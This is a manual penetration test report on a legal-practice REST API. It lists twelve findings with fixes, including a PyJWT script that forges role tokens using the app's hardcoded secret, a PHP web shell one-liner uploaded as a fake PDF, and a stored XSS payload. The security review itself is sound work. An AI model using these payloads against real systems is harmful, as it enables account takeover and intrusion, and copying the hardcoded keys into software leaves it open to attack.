# Manual Penetration Test Report — LawyerApp API


## Executive Summary

A full manual penetration test was conducted against the LawyerApp REST API covering all endpoints. The test targeted the four categories required by the Operate rubric: **role bypass**, **JWT tampering**, **path traversal on file operations**, and **IDOR on Document/LegalProcess**.

**12 vulnerabilities were identified** — 3 Critical, 4 High, 4 Medium, 1 Low — plus several controls confirmed to be working correctly.

The most severe finding is that the JWT signing secret is stored in plaintext in `appsettings.json`. An attacker with read access to the configuration file can forge bearer tokens for any role (Lawyer, Admin, LegalAssistant) and fully bypass all controller-level authorization. This was demonstrated live during the test.

---

## Scope

| Endpoint | Method | Auth Required | Role |
|---|---|---|---|
| `/api/auth/register` | POST | No | — |
| `/api/auth/login` | POST | No | — |
| `/api/user` | GET | Yes | Lawyer |
| `/api/client/get/all` | GET | Yes | Any |
| `/api/processes` | GET | Yes | Lawyer |
| `/api/processes` | POST | Yes | Lawyer |
| `/api/processes/{id}` | GET | Yes | Any (access-controlled) |
| `/api/documents/upload/{processId}` | POST | Yes | Lawyer |
| `/api/documents/download/{id}` | GET | Yes | Any (access-controlled) |
| `/api/documents/process/{processId}` | GET | Yes | Any (access-controlled) |
| `/api/audit/process/{processId}` | GET | Yes | Lawyer, LegalAssistant |

---

## Test Methodology

Tests were executed manually using `curl`. Where token forgery was required, a Python script using `PyJWT` was used to sign tokens with the observed JWT secret. The app was run locally against a live PostgreSQL database. No mocks were used.

Attack categories tested:
- Unauthenticated access probes
- Role bypass (Client/LegalAssistant/Admin accessing Lawyer-only endpoints)
- JWT tampering (invalid signature, algorithm=none, forged role claims)
- IDOR (cross-user access on Document and LegalProcess by ID)
- Path traversal (filename injection, category parameter injection)
- Input validation (SQLi, XSS, length, null bytes)
- Brute force / account lockout
- Race conditions (concurrent registration)
- Security headers audit
- HTTP verb tampering
- Mass assignment
- File type validation bypass

---

## Findings

### VULN-01 — JWT Secret Hardcoded in Plaintext (CRITICAL)

**File:** `LawyerApp/appsettings.json`  
**CVSS:** ~9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Description:**  
The JWT signing secret is stored in plaintext inside `appsettings.json`:

```json
"Jwt": {
  "SecretKey": "IHOPETHISISREALYWORKINGCOMEONE_IHOPETHISISREALYWORKINGCOMEONE"
}
```

Any user who can read the configuration file — via source code access, a misconfigured endpoint, or a container escape — can forge bearer tokens with arbitrary claims including any role.

**Proof of exploitation:**

Using PyJWT, a `Lawyer`-role token was forged for a `Client` user ID and accepted by the server:

```bash
# Forged Lawyer token was accepted on all Lawyer-only endpoints:
GET /api/user              → HTTP 200 + full user list
GET /api/processes         → HTTP 200 + process list
POST /api/processes        → HTTP 201 + process created
GET /api/audit/process/…   → HTTP 200 + full audit trail
GET /api/documents/process/… → HTTP 200 + document list
GET /api/documents/download/1 → HTTP 200 + file content
```

A `Client` user (`pentest.client@evil.com`, ID `6275d628-…`) successfully created a legal process and accessed all Lawyer-only endpoints by presenting a forged JWT.

**Impact:** Complete authentication bypass. An attacker with config read access can impersonate any role, including Lawyer and Admin, and perform all privileged operations.

**Recommendation:**
- Store JWT secret in an environment variable or HashiCorp Vault (the Vault integration is already partially implemented but disabled).
- Rotate the current secret immediately.
- Enforce a minimum 256-bit (32-byte) random key.

---

### VULN-02 — File Encryption Uses Hardcoded Static Key and IV (CRITICAL)

**File:** `LawyerApp/Infrastructure/Security/FileEncryptionService.cs`  
**CVSS:** ~8.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Description:**  
When `FileEncryption:Key` and `FileEncryption:IV` are absent from configuration (as they are in the current `appsettings.json`), the service silently falls back to hardcoded credentials:

```csharp
_key = System.Text.Encoding.UTF8.GetBytes("a-very-secret-key-32-chars-long!");
_iv  = System.Text.Encoding.UTF8.GetBytes("a-secret-iv-16-!");
```

This has two consequences:

1. **Known key**: Any attacker who reads the source code can decrypt all stored documents.
2. **Static IV reuse**: All files are encrypted with the same key+IV pair. AES-CBC with a fixed IV leaks prefix equality between plaintexts and is trivially distinguishable from random.

**Proof:** The upload endpoint accepted files and stored them. The download endpoint decrypted and returned them successfully, confirming the hardcoded key/IV is in use.

**Impact:** All uploaded documents can be decrypted offline by anyone who has read access to the stored files and the source code.

**Recommendation:**
- Remove the fallback. Fail loudly if encryption configuration is missing.
- Generate a unique random IV per file and prepend it to the ciphertext (standard AES-CBC practice).
- Rotate all existing encrypted files after fixing the key/IV.

---

### VULN-03 — Race Condition Allows Duplicate Email Registration (CRITICAL)

**File:** `LawyerApp/Application/Services/UserAggregate/ClientService.cs`  
**CVSS:** ~7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L)

**Description:**  
Two concurrent registration requests for the same email address both succeed, creating two database rows with the same email:

```bash
# Concurrent:
curl -X POST /api/auth/register -d '{"email":"dup@test.com", ...}' &
curl -X POST /api/auth/register -d '{"email":"dup@test.com", ...}' &

# Database result:
Id: 097deb58-…  | Name: DupUser | Email: dup@test.com
Id: d86ab435-…  | Name: DupUser | Email: dup@test.com
```

The `Users` table has no `UNIQUE` constraint on the `Email` column, and the service checks for email uniqueness with a regular `SELECT` before `INSERT` — a classic TOCTOU race.

**Impact:** Two accounts share the same email. Login picks the first match — the second account can never be logged into, creating a ghost account. Worse, if the attacker registers first and the victim registers second, the attacker controls the first match and the victim is locked out of their own email address.

**Recommendation:**
- Add a `UNIQUE` constraint on `Users.Email` at the database level.
- Handle the resulting unique-constraint exception in the service layer.

---

### VULN-04 — `GET /api/client/get/all` Accessible by Any Authenticated User (HIGH)

**File:** `LawyerApp/API/Aggregates/User/Client/ClientController.cs`  
**CVSS:** ~6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Description:**  
The endpoint is decorated with `[Authorize]` (any authenticated user) instead of `[Authorize(Roles = "Lawyer")]`. Any client, including a freshly registered user, can retrieve the name and email of every user in the system.

```bash
# Tested with a Client-role token:
GET /api/client/get/all → HTTP 200
[
  {"name":"Alice Lawyer","email":"alice@lawyerfirm.com"},
  {"name":"Test Lawyer","email":"lawyer@test.com"},
  {"name":"VictimClient","email":"victim@target.com"},
  ...
]
```

**Impact:** Complete PII enumeration. Any registered client can harvest names and email addresses of all users.

**Recommendation:**  
Add `[Authorize(Roles = "Lawyer")]` to the `GetAll` action (or at class level) in `ClientController`.

---

### VULN-05 — `HandleResult` Returns HTTP 400 for All Errors (HIGH)

**File:** `LawyerApp/API/Shared/ApiController.cs`  
**CVSS:** ~5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
`HandleResult<T>` always calls `BadRequest()` for any failure, regardless of whether the underlying error code is 403, 404, or 500:

```csharp
return BadRequest(new { errorCode = result.Error.Code, message = result.Error.Message });
```

Observed behaviour:
- Access denied (403) → HTTP 400 with body `{"errorCode":"403","message":"Access denied."}`
- Not found (404) → HTTP 400 with body `{"errorCode":"404","message":"Document not found."}`
- Server error (500) → HTTP 400

**Impact:**
- WAFs, SIEM, and monitoring systems that act on HTTP status codes cannot distinguish between access denials and bad requests.
- Breaks REST semantics.
- May suppress alerts for IDOR probes (403s are not counted as 403s at the network layer).

**Recommendation:**  
Map the result error code to the correct HTTP status in `HandleResult`:

```csharp
return result.Error.Code switch {
    403 => StatusCode(403, errorBody),
    404 => NotFound(errorBody),
    409 => Conflict(errorBody),
    _   => StatusCode(500, errorBody)
};
```

---

### VULN-06 — Stored XSS via Unsanitized Name Field (HIGH)

**File:** `LawyerApp/Application/DTOS/Users/CreateClientDto.cs` / `ClientService.cs`  
**CVSS:** ~6.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

**Description:**  
The `name` field in registration accepts arbitrary HTML without sanitization. The value is stored in the database and returned verbatim via `GET /api/user`:

```bash
POST /api/auth/register
{"name":"<script>alert(1)</script>","email":"xss@test.com",...}
→ HTTP 201, stored as-is.

GET /api/user (Lawyer)
→ {"id":"41263357-…","name":"<script>alert(1)</script>","email":"xss@test.com","role":"Client"}
```

Any front-end that renders the `name` field in HTML without escaping will execute the injected script.

**Impact:** Stored XSS targeting privileged users (Lawyers) who view the user list.

**Recommendation:**
- Validate `name` to reject HTML tags (regex or allow-list of permitted characters).
- Rely on output encoding in the front-end, but defense-in-depth requires input validation at the API boundary too.

---

### VULN-07 — No Input Length Validation (HIGH)

**File:** `LawyerApp/Application/DTOS/Users/CreateClientDto.cs`  
**CVSS:** ~5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

**Description:**  
A 10,000-character email string was accepted, registered, and persisted without error:

```bash
POST /api/auth/register {"email":"aaaa...10000chars...@test.com",...}
→ HTTP 201, stored in DB
```

**Impact:** Database bloat, potential denial of service if done at scale, and rendering issues in any admin UI that displays email addresses.

**Recommendation:**  
Add `[MaxLength(254)]` (RFC 5321 max for email) and `[MaxLength(200)]` (for name) data annotations to `CreateClientDto`.

---

### VULN-08 — File Content Not Validated (Only Extension Checked) (HIGH)

**File:** `LawyerApp/Application/Services/Document/DocumentService.cs`  
**CVSS:** ~5.0 (AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N)

**Description:**  
The upload service validates file extension only:

```csharp
var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
if (extension != ".pdf" && extension != ".docx") { ... }
```

A PHP shell renamed to `.pdf` was accepted and stored:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.pdf
POST /api/documents/upload/{processId}?category=petition  →  HTTP 201
```

While the file is encrypted at rest (with the currently known key), if encryption ever fails or the key is known, the file is recoverable. More critically, this permits storing arbitrary content as a "PDF".

**Impact:** Malicious files stored in legal processes. If encryption is later disabled or bypassed, stored payloads become directly exploitable.

**Recommendation:**  
Validate MIME type based on file content (magic bytes), not just the extension:
- PDF: starts with `%PDF-`
- DOCX: is a valid ZIP containing `[Content_Types].xml`

---

### VULN-09 — Missing Security Response Headers (MEDIUM)

**CVSS:** ~4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)

**Description:**  
None of the following headers are present on any response:

```
X-Frame-Options
X-Content-Type-Options
X-XSS-Protection
Content-Security-Policy
Strict-Transport-Security
Referrer-Policy
Permissions-Policy
```

**Proof:**

```bash
curl -sI http://localhost:5139/api/auth/login | grep -iE "x-frame|content-security|strict-transport"
# (no output)
```

**Impact:** Exposes the application to clickjacking, MIME-sniffing, and cross-site scripting in browser contexts.

**Recommendation:**  
Add the following to `Program.cs`:

```csharp
app.Use(async (context, next) => {
    context.Response.Headers["X-Frame-Options"] = "DENY";
    context.Response.Headers["X-Content-Type-Options"] = "nosniff";
    context.Response.Headers["Referrer-Policy"] = "no-referrer";
    await next();
});
```

For HSTS, configure via the HTTPS redirection middleware.

---

### VULN-10 — Traversal Filename Stored in Database (MEDIUM)

**File:** `LawyerApp/Application/Services/Document/DocumentService.cs`  
**CVSS:** ~3.7 (AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N)

**Description:**  
The original `file.FileName` (user-controlled) is stored in the `FileName` column without validation. A filename of `../../escape.pdf` was accepted and stored:

```json
{"documentId":3,"fileName":"../../escape.pdf","fileSize":37,...}
```

While the actual storage path is safe (uses a UUID-based `StoredFileName`), the traversal string appears verbatim in API responses and in the `Content-Disposition` header during download.

**Impact:** Potential response manipulation if the filename is echoed in a `Content-Disposition: attachment; filename="../../escape.pdf"` header, which may cause some browsers/clients to save files to unexpected paths.

**Recommendation:**  
Sanitize `file.FileName` to strip directory separators and limit to alphanumeric + `-_. ` characters before storing.

---

### VULN-11 — RBAC Inconsistency for Admin Role (MEDIUM)

**File:** `LegalProcessService.cs`, `AuditService.cs` vs `UserController.cs`, `LegalProcessController.cs`  
**CVSS:** ~3.1 (AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N)

**Description:**  
The `Admin` role is granted service-level bypasses in some places but is locked out by controller-level role attributes in others:

| Endpoint | Admin result |
|---|---|
| `GET /api/processes/{id}` (service bypasses access check) | ✅ 200 |
| `GET /api/audit/process/{id}` (service bypasses access check) | ✅ 200 |
| `GET /api/processes` (controller: `[Authorize(Roles="Lawyer")]`) | ❌ 403 |
| `GET /api/user` (controller: `[Authorize(Roles="Lawyer")]`) | ❌ 403 |
| `GET /api/audit/process/{id}` (controller: `[Authorize(Roles="Lawyer,LegalAssistant")]`) | ❌ 403 |

Admin bypasses exist in the service layer but the controller's role guard still blocks them. The net result is that the Admin role has partial, inconsistent access.

**Impact:** If an Admin account is ever legitimately created, it will have confusing partial access. The service-level bypasses become unreachable code, providing false assurance.

**Recommendation:**  
Decide on Admin's intended privilege level and implement it consistently either at the controller or via a policy.

---

### VULN-12 — No Rate Limiting on Registration Endpoint (LOW)

**CVSS:** ~3.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

**Description:**  
The `POST /api/auth/register` endpoint has no throttling. An unauthenticated attacker can create unlimited accounts. Combined with the race condition (VULN-03), this facilitates account enumeration and DoS via email namespace exhaustion.

**Recommendation:**  
Apply rate limiting middleware (e.g., `AspNetCoreRateLimit`) to authentication endpoints: max 10 registrations per IP per hour.

---

## Controls Verified as Working

| Control | Result |
|---|---|
| Unauthenticated access to all protected endpoints | ✅ Returns HTTP 401 |
| JWT algorithm=none attack | ✅ Rejected (HTTP 401) |
| JWT with invalid signature (wrong secret) | ✅ Rejected (HTTP 401) |
| Malformed JWT (truncated) | ✅ Rejected (HTTP 401) |
| IDOR: Client accessing another client's LegalProcess | ✅ Denied (403) |
| IDOR: Client accessing documents of another process | ✅ Denied (403) |
| IDOR: Audit log for process user has no access to | ✅ Denied (403) |
| Mass assignment (role escalation via request body) | ✅ Not possible (DTO has no role field) |
| SQL injection via login email/password | ✅ Not injectable (EF Core parameterized) |
| Brute force — account lockout after 5 failures | ✅ Locks for 15 min |
| HTTP verb tampering (DELETE/PUT on read-only resources) | ✅ Returns HTTP 405 |
| Path traversal via `category` parameter | ✅ Mapped to fixed set of subfolders |
| Path traversal via stored file name | ✅ StoredFileName uses UUID, not user input |
| Empty/missing required fields in registration | ✅ Validated, returns field-level errors |

---

## Severity Summary

| ID | Title | Severity |
|---|---|---|
| VULN-01 | JWT secret hardcoded in plaintext | **CRITICAL** |
| VULN-02 | File encryption with hardcoded static key+IV | **CRITICAL** |
| VULN-03 | Race condition allows duplicate email registration | **CRITICAL** |
| VULN-04 | `GET /api/client/get/all` exposes all user PII to any authenticated user | **HIGH** |
| VULN-05 | `HandleResult` returns HTTP 400 for all error types | **HIGH** |
| VULN-06 | Stored XSS via unsanitized name field | **HIGH** |
| VULN-07 | No input length validation (email, name) | **HIGH** |
| VULN-08 | File content not validated (extension only) | **HIGH** |
| VULN-09 | Missing security response headers | **MEDIUM** |
| VULN-10 | Path traversal filename stored in database | **MEDIUM** |
| VULN-11 | Admin role RBAC inconsistency | **MEDIUM** |
| VULN-12 | No rate limiting on registration endpoint | **LOW** |

---

## Appendix — Test Commands

### JWT Forgery (VULN-01)

```python
import jwt, datetime

SECRET = "IHOPETHISISREALYWORKINGCOMEONE_IHOPETHISISREALYWORKINGCOMEONE"
ROLE_CLAIM = "http://schemas.microsoft.com/ws/2008/06/identity/claims/role"

payload = {
    "sub": "6275d628-cb21-48cf-855a-2645925138ab",
    "email": "pentest.client@evil.com",
    ROLE_CLAIM: "Lawyer",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30),
    "iss": "LawyerApp",
    "aud": "LawyerAppUsers",
}
forged_token = jwt.encode(payload, SECRET, algorithm="HS256")
```

### Race Condition (VULN-03)

```bash
curl -X POST /api/auth/register -d '{"email":"dup@test.com",...}' &
curl -X POST /api/auth/register -d '{"email":"dup@test.com",...}' &
wait
# psql: SELECT COUNT(*) FROM "Users" WHERE "Email" = 'dup@test.com'; → 2
```

### PII Enumeration (VULN-04)

```bash
CLIENT_TOKEN="<any valid Client-role JWT>"
curl -H "Authorization: Bearer $CLIENT_TOKEN" http://localhost:5139/api/client/get/all
# Returns all users' names and emails
```